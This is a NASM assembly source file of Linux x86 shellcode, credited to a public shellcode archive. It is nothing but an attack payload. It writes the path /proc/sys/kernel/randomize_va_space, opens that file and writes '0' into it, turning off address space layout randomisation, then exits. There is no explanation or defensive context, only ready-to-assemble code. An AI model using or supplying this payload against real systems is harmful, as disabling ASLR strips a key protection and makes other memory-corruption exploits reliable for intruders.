; source code :http://shell-storm.org/shellcode/files/shellcode-813.php 
; original nasm file 

global _start			

section .text

_start:
    
   xor    eax,eax
   push   eax
   push   0x65636170
   push   0x735f6176
   push   0x5f657a69
   push   0x6d6f646e
   push   0x61722f6c
   push   0x656e7265
   push   0x6b2f7379
   push   0x732f636f
   push   0x72702f2f
   mov    ebx,esp
   mov    cx,0x2bc
   mov    al,0x8
   int    0x80
   mov    ebx,eax
   push   eax
   mov    dx,0x3a30
   push   dx
   mov    ecx,esp
   xor    edx,edx
   inc    edx
   mov    al,0x4
   int    0x80
   mov    al,0x6
   int    0x80
   inc    eax
   int    0x80